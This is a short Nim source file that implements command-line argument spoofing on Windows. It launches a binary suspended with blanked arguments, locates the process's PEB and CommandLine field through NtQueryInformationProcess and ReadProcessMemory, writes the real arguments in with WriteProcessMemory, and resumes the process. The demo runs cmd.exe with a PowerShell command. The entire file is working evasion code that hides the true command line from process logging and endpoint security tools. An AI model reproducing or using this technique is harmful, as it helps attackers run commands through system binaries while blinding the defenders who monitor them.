import winim
import strutils


proc executeSpoofedLolbin(realCmdlineN: string) =

    # Create spoodef cmdline
    var binary = realCmdlineN.split(" ")[0]
    var argsLen = len(realCmdlineN) - len(binary)
    var spoofedCmdlineN = binary & ' '.repeat(argsLen)
    var realCmdline = newWideCString(realCmdlineN)
    var spoofedCmdline = newWideCString(spoofedCmdlineN)

    # Create suspended process
    var si: STARTUPINFOEX
    var pi: PROCESS_INFORMATION
    if CreateProcess(
        NULL,
        spoofedCmdline,
        NULL,
        NULL, 
        FALSE,
        CREATE_SUSPENDED,
        NULL,
        NULL,
        addr si.StartupInfo,
        addr pi
    ) != TRUE:
        quit()

    # Get remote PEB address
    var bi: PROCESS_BASIC_INFORMATION
    var ret: DWORD
    if NtQueryInformationProcess(
        pi.hProcess,
        0,
        addr bi,
        cast[windef.ULONG](sizeof(bi)),
        addr ret
    ) != 0:
        quit()
    
    # Get RTL_USER_PROCESS_PARAMETERS address
    let peb = bi.PebBaseAddress
    let processParametersOffset = cast[int](peb) + 0x20
    var processParametersAddress: LPVOID
    if ReadProcessMemory(pi.hProcess, cast[LPCVOID](processParametersOffset), addr processParametersAddress, 8, NULL) != TRUE:
        quit()

    # Get CommandLine member address
    var cmdLineOffset = cast[int](processParametersAddress) + 0x70 + 0x8
    var cmdLineAddress: LPVOID
    if ReadProcessMemory(pi.hProcess, cast[LPCVOID](cmdLineOffset), addr cmdLineAddress, 8, NULL) != TRUE:
        quit()
    
    # Change command line
    if WriteProcessMemory(
        pi.hProcess,
        cast[LPVOID](cmdLineAddress),
        cast[LPCVOID](realCmdline),
        len(realCmdline) * 2,
        NULL
    ) != TRUE:
        quit()

    # Resume process
    ResumeThread(pi.hThread)



executeSpoofedLolbin("c:\\windows\\system32\\cmd.exe /c powershell -command get-process chrome")




